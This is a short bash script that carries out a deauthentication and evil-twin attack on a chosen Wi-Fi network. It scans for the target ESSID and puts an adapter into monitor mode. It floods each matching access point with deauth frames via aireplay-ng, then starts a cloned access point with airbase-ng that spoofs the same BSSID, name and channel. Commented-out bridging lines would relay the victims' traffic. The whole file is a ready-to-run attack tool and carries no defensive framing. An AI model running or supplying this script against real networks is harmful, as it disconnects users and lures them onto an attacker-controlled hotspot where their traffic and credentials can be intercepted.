#!/bin/bash

sudo iwlist wlp4s0 scan | grep "ESSID"
echo "ESSID?"
read essid
#essid="TP-Link_0816"
clear
array=( $(sudo iwlist wlp4s0 scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )
count=0
echo "Do you want to DEAUTH and CLONE attack ${essid} Yes/No ?"
read response
if [ $response = Yes ]
then	
	channel=1
	address=00:00:00:00:00:00
	sudo ifconfig wlxf81a6709dba3 down
	sudo iwconfig wlxf81a6709dba3 mode monitor
	sudo ifconfig wlxf81a6709dba3 up
	echo "Attack launched"
	for i in "${array[@]}"
	do
		if [ $(($count%8)) -eq 4 ]
		then
			address=$i
		fi
		if [ $(($count%8)) -eq 5 ]
		then
			channel="${i//[!0-9]/}"
			#echo "Channel ${channel} and MAC ${address}"
			sudo iwconfig wlxf81a6709dba3 channel ${channel}
			sudo aireplay-ng -0 150 -a ${address} wlxf81a6709dba3
		fi
		((++count))
	done
	echo "Deauth done, creating clone hotspot"


	if [ "${channel}" -lt "1" ] || [ "${channel}" -gt "11" ]
	then 
		channel=1
	fi
	sudo airbase-ng -a ${address} --essid ${essid} -c ${channel} wlxf81a6709dba3
	#brctl addbr bridge
	#brctl addif bridge enp4s0
	#brctl addif bridge at0
	#ifconfig enp4s0 0.0.0.0 up
	#ifconfig at0 0.0.0.0 up
	#ifconfig bridge up
	#dhclient bridge &
fi




